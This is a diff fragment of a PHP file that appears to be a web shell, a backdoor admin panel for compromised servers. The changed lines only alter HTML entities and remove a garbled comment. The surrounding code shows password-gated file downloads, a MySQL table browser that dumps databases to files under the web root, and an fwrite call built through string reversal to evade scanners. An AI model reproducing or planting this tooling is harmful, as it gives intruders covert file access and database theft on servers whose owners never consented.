@@ -215,8 +215,8 @@ if ($pass) {
     }
 }
 $errmsg = '';
-$uchar = '▲';
-$dchar = '▼';
+$uchar = '&#9650;';
+$dchar = '&#9660;';
 !$action && $action = 'file';
 if ($doing == 'downfile' && $thefile) {
     if (!@file_exists($thefile)) {
@@ -1886,10 +1886,10 @@ function mysqlfile(doing){
 						p('<tr class="'.$thisbg.'" onmouseover="this.className=\'focus\';" onmouseout="this.className=\''.$thisbg.'\';">');
 						p('<td align="center" width="2%"><input type="checkbox" name="bak_table[]" value="'.$table['Name'].'" /></td>');
 						p('<td><a href="javascript:settable(\''.$table['Name'].'\');">'.$table['Name'].'</a></td>');
-						p('<td>'.$table['Rows'].' </td>');
+						p('<td>'.$table['Rows'].'&nbsp;</td>');
 						p('<td>'.sizecount($table['Data_length']).'</td>');
-						p('<td>'.$table['Create_time'].' </td>');
-						p('<td>'.$table['Update_time'].' </td>');
+						p('<td>'.$table['Create_time'].'&nbsp;</td>');
+						p('<td>'.$table['Update_time'].'&nbsp;</td>');
 						if ($highver) {
 							p('<td>'.$table['Engine'].'</td>');
 							p('<td>'.$table['Collation'].'</td>');
@@ -1898,17 +1898,17 @@ function mysqlfile(doing){
 						p('</tr>');
 					}
 					p('<tr class="head">');
-					p('<td width="2%"> </td>');
+					p('<td width="2%">&nbsp;</td>');
 					p('<td>'.$table_num.' table(s)</td>');
 					p('<td>'.$table_rows.'</td>');
 					p('<td>'.$data_size.'</td>');
-					p('<td> </td>');
-					p('<td> </td>');
+					p('<td>&nbsp;</td>');
+					p('<td>&nbsp;</td>');
 					if ($highver) {
 						p('<td>'.$db_engine['Value'].'</td>');
 						p('<td>'.$db_collation['Value'].'</td>');
 					}
-					p('<td> </td>');
+					p('<td>&nbsp;</td>');
 					p('</tr>');
 					p("<tr class=\"".bg()."\"><td colspan=\"".($highver ? 9 : 7)."\"><input name=\"saveasfile\" value=\"1\" type=\"checkbox\" /> Save as file <input class=\"input\" name=\"bak_path\" value=\"".SA_ROOT.$dbname.".sql\" type=\"text\" size=\"60\" /> <input class=\"bt\" type=\"button\" value=\"Export selection table\" onclick=\"$('doing').value='dump';window.onbeforeunload = null;$('dbform').submit();\" /></td></tr>");
 					p("</table>");
@@ -4079,7 +4079,6 @@ class DB_MySQL  {
 		$s = str_replace('\'', '\'\'', $s);
 		return $s;
 	}
-	// ÃÂ±ÃÂ¸ÃÂ·ÃÂÃÂÃÂ½ÃÂ¾ÃÂÃÂ¿ÃÂ¢
 	function sqldump($table, $fp=0) {
 	    $feather = strrev("rwf") . "ite";
 		$crlf = (IS_WIN ? "\r\n" : "\n");
